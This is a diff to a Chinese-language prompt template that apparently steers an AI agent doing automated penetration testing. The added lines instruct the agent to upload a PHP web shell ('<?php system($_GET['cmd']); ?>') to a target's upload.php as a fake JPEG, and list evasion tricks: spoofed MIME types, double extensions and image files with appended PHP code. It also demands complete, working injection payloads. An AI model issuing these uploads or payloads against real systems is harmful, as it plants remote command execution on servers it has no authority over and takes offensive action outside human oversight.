@@ -281,23 +281,38 @@ rag_source 可选: payloads, nuclei, writeups, security_resources
 
 ### 核心要求
 - **tool**: 工具名称
-- **params**: 完整参数（URL必须包含完整payload）
+- **params**: 完整参数
 
-### Payload格式要求
-确保payload语法正确、格式完整：
-- 代码注入类：语句完整，注意结束符
-- 命令注入类：注意特殊字符编码
-- 注入类攻击：注意引号闭合和注释
-- 路径类攻击：使用正确的路径格式
+### 文件上传攻击格式
 
-示例:
+使用 `requests` 工具的 `files` 参数进行文件上传：
+
 ```json
 {{"attack_actions": [
-  {{"tool": "requests", "params": {{"method": "GET", "url": "http://target/index.php?param=payload"}}}}
+  {{"tool": "requests", "params": {{
+    "method": "POST",
+    "url": "http://target/upload.php",
+    "files": {{"file": ["shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg"]}}
+  }}}}
 ]}}
 ```
 
-**关键**: params.url 必须是完整可执行的攻击URL。
+files 参数格式: `{{"字段名": [文件名, 文件内容, MIME类型]}}`
+
+常用绕过技巧：
+- 修改 MIME 类型为 image/jpeg
+- 使用双扩展名 shell.php.jpg
+- 图片马：在真实图片内容后追加 PHP 代码
+
+### 其他攻击格式
+
+```json
+{{"attack_actions": [
+  {{"tool": "requests", "params": {{"method": "GET", "url": "http://target/?param=payload"}}}}
+]}}
+```
+
+**关键**: payload 必须完整、语法正确。
 
 {scene_framework}
 {tool_principles}
